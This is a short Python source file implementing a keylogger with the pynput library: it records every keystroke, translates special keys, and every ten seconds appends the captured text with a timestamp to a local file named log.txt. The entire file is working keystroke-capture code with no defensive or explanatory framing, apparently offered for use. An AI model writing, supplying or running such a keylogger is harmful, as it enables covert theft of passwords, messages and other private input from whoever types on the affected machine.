from datetime import datetime
from pynput import keyboard
from threading import Timer
from datetime import datetime
from time import sleep

class Keylogger:
    def __init__(self,interval):
        self.interval = interval
        self.log = ""

    def start(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        sleep(self.interval)
        self.writeLog()
    def on_press(self, key):
        specialKeys = {"None":"", "Key.esc":"" , "Key.f1":"" , "Key.f2":"" , "Key.f3":"" , "Key.f4":"" , "Key.f5":"" , "Key.f6":"" , "Key.f7":"" , "Key.f8":"" , "Key.f9":"" , "Key.f10":"" , "Key.f11":"" , "Key.f12":"" , "Key.num_lock":"", "Key.pause":"", "Key.scroll_lock":"", "Key.print_screen":"", "Key.delete":"", "Key.insert":"", "Key.menu":"", "Key.cmd_r":"", "Key.tab":"", "Key.page_down": "", "Key.page_up": "", "Key.home": "", "Key.end": "", "Key.down": "", "Key.up": "","Key.right": "", "Key.left": "", "Key.ctrl_r": "", "Key.backspace": "","Key.shift_r": "" ,"Key.space": " ","Key.ctrl": "", "Key.shift": "", "Key.alt": "", "Key.cmd": "", "Key.caps_lock" : "CAPS_LOCK", "Key.tabNone" : "", "Key.enter": "" }
        noneKey = {"None":""}
        try:
            if str(key.char) in noneKey:
                self.log += noneKey[str(key.char)]
            else:
                self.log += str(key.char)
        except AttributeError:
            if str(key) in specialKeys:
                # print(str(key))
                self.log += specialKeys[str(key)]
            else:
                self.log += " "
                self.log += str(key)
                self.log += " "
        self.log += ""

    def writeLog(self):
        now = datetime.now()
        currentTime = now.strftime("%d/%m/%Y %H:%M:%S")
        logC = currentTime + " - "
        logC += self.log
        f = open("log.txt","a")
        f.write(logC)
        f.write("\n")
        f.close()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.writeLog)
        # timer.daemon = True
        timer.start()


def main():
    keylogger = Keylogger(10)
    keylogger.start()


if __name__=='__main__':
    main()
